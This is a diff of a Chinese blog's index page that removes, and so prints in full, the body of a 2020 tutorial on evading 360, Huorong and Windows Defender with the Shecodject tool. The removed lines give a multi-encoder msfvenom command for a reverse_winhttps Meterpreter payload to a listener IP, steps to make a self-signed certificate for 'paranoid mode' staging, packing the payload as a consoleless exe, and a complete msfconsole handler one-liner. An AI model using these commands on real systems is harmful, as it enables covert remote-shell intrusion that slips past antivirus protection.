@@ -185,7 +185,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-07-27 15:19:31 / 修改时间：15:32:37" itemprop="dateCreated datePublished" datetime="2020-07-27T15:19:31+08:00">2020-07-27</time>
+              <time title="创建时间：2020-07-27 15:19:31 / 修改时间：15:35:19" itemprop="dateCreated datePublished" datetime="2020-07-27T15:19:31+08:00">2020-07-27</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -220,44 +220,14 @@
 <p><img src="/2020/07/27/shecodject%E5%85%8D%E6%9D%80360%E7%81%AB%E7%BB%92windows-defender/ShecodjectBypassAv-1.png" alt="BypassAv-1.png"></p>
 <p>scc 是指定一个自己生成的MSF payload raw格式马儿/也可以指定CS的payload<br>mpr 是脚本自动生成payload<br>obf 混淆代码<br>exe 打包成exe<br>msf 设置监听</p>
 <p>这里直接mpr</p>
-<p><img src="/2020/07/27/shecodject%E5%85%8D%E6%9D%80360%E7%81%AB%E7%BB%92windows-defender/ShecodjectBypassAv-2.png" alt="BypassAv-2.png"></p>
-<p>参数自动填好了   run就行<br>然后进入exe</p>
-<blockquote>
-<p>set noconsole True</p>
-</blockquote>
-<p><img src="/2020/07/27/shecodject%E5%85%8D%E6%9D%80360%E7%81%AB%E7%BB%92windows-defender/ShecodjectBypassAv-3.png" alt="BypassAv-3.png"><br>设置noconsole<br>run</p>
-<p>启动msf监听</p>
-<blockquote>
-<p>msfconsole -r msf_rc_052020_54</p>
-</blockquote>
-<p>运行程序</p>
-<p><img src="/2020/07/27/shecodject%E5%85%8D%E6%9D%80360%E7%81%AB%E7%BB%92windows-defender/ShecodjectBypassAv-5.png" alt="BypassAv-5.png"></p>
-<p><img src="/2020/07/27/shecodject%E5%85%8D%E6%9D%80360%E7%81%AB%E7%BB%92windows-defender/ShecodjectBypassAv-6.png" alt="BypassAv-6.png"></p>
-<p><img src="/2020/07/27/shecodject%E5%85%8D%E6%9D%80360%E7%81%AB%E7%BB%92windows-defender/ShecodjectBypassAv-7.png" alt="BypassAv-7.png"></p>
-<H1>过windows defender
-
-<blockquote>
-<p>openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout payload.key -out payload.crt</p>
-</blockquote>
-<p>生成一个ssl证书</p>
-<p>保存 为pem 格式cat payload.key payload.crt &gt; payload.pem</p>
-<p><img src="/2020/07/27/shecodject%E5%85%8D%E6%9D%80360%E7%81%AB%E7%BB%92windows-defender/ShecodjectBypassAv-8.png" alt="BypassAv-8.png"></p>
-<p>利用证书生成木马(偏执模式，参考资料：<a href="https://green-m.me/2016/11/23/msf-paranoid-mode/" target="_blank" rel="noopener">https://green-m.me/2016/11/23/msf-paranoid-mode/</a>)</p>
-<blockquote>
-<p>msfvenom -p windows/meterpreter/reverse_winhttps LHOST=192.168.190.130 LPORT=8888 –platform windows -a x86 HandlerSSLCert=./payload.pem StagerVerifySSLCert=true -s 42 –smallest -e x86/shikata_ga_nai -i 9 -f raw| msfvenom –platform windows -a x86 -e x86/countdown -i 8 -f raw |msfvenom –platform windows -a x86 -e x86/call4_dword_xor -i 6 -b “\x00\x0a\x0d” -f raw &gt; shellcode.raw</p>
-</blockquote>
-<p>运行shecodject脚本，进入scc<br><img src="/2020/07/27/shecodject%E5%85%8D%E6%9D%80360%E7%81%AB%E7%BB%92windows-defender/ShecodjectBypassAv-9.png" alt="BypassAv-9.png"></p>
-<p>设置source为shellcode.raw路径<br>run<br>再进入exe，默认参数run</p>
-<p><img src="/2020/07/27/shecodject%E5%85%8D%E6%9D%80360%E7%81%AB%E7%BB%92windows-defender/ShecodjectBypassAv-10.png" alt="BypassAv-10.png"></p>
-<p>进入监听</p>
-<blockquote>
-<p>msfconsole -q -x ‘use exploit/multi/handler;set ExitOnSession false;set PAYLOAD windows/meterpreter/reverse_winhttps;set LHOST 192.168.190.130;set LPORT 8888;set HandlerSSLCert /root/Tools/Shecodject/payload.pem;set StagerVerifySSLCert true;seexitt SessionCommunicationTimeout 600;set autorunscript post/windows/manage/migrate;run -j -z’</p>
-</blockquote>
-<p><img src="/2020/07/27/shecodject%E5%85%8D%E6%9D%80360%E7%81%AB%E7%BB%92windows-defender/ShecodjectBypassAv-11.png" alt="BypassAv-11.png"></p>
-<p><img src="/2020/07/27/shecodject%E5%85%8D%E6%9D%80360%E7%81%AB%E7%BB%92windows-defender/ShecodjectBypassAv-12.png" alt="BypassAv-12.png"></p>
-<p><img src="/2020/07/27/shecodject%E5%85%8D%E6%9D%80360%E7%81%AB%E7%BB%92windows-defender/ShecodjectBypassAv-13.png" alt="BypassAv-13.png"></p>
-<p><img src="/2020/07/27/shecodject%E5%85%8D%E6%9D%80360%E7%81%AB%E7%BB%92windows-defender/ShecodjectBypassAv-14.png" alt="BypassAv-14.png"></p>
-</H1>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/07/27/shecodject%E5%85%8D%E6%9D%80360%E7%81%AB%E7%BB%92windows-defender/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
